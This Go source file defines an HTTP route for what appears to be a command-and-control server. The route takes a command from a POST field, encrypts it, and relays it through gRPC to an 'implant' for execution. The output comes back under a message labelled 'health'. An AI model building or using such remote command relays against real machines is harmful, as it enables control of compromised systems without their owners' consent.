/*
 * @Description:
 * @Version: 2.0
 * @Autor: ABing
 * @Date: 2024-06-19 11:14:31
 * @LastEditors: lhl
 * @LastEditTime: 2024-06-19 12:29:43
 */

package router

import (
	"gotoexec/grpcapi"
	"gotoexec/middlewares"
	"gotoexec/server/control"
	"gotoexec/util"
	"log"
	"net/http"

	"github.com/gin-gonic/gin"
)

func InitControlRouter(Router *gin.RouterGroup) {
	p := Router.Group("control").Use(middlewares.CostTime()).Use(middlewares.BasicAuth())
	{
		p.POST("", func(context *gin.Context) {

			cmd := new(grpcapi.Command)

			cmd.In, _ = util.EncryptByAes([]byte(context.PostForm("cmd")))
			cmdout, err := control.NewImplantcontrols.RunCommand(cmd)

			out, err := util.DecryptByAes(cmdout.Out)

			if err != nil {
				log.Panicln(err)
			}

			context.JSON(http.StatusOK, gin.H{
				"code": http.StatusOK,
				"data": string(out),
				"msg":  "health",
			})
		})

	}
}
